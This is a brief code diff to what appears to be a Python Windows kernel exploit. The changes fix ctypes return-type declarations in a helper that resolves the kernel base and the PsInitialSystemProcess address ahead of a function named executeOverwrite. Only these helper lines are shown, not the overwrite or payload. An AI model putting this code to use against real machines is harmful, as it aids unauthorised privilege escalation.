@@ -152,9 +152,9 @@ def getkernelBase(driver):
 
 def get_PsISP_kernel_address(kernel_base, img_name):
 
-    kernel32.LoadLibraryA.restype = c_long()
+    kernel32.LoadLibraryA.restype = c_long
     kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
-    kernel32.GetProcAddress.restype = c_ulong()
+    kernel32.GetProcAddress.restype = c_ulong
 
     # Load kernel image in userland and get PsInitialSystemProcess offset
 
@@ -344,6 +344,7 @@ def executeOverwrite():
 
         # Get system process base.
 
+ 
         system_process_base_pointer = \
             get_PsISP_kernel_address(kernel_base, img_name)
 
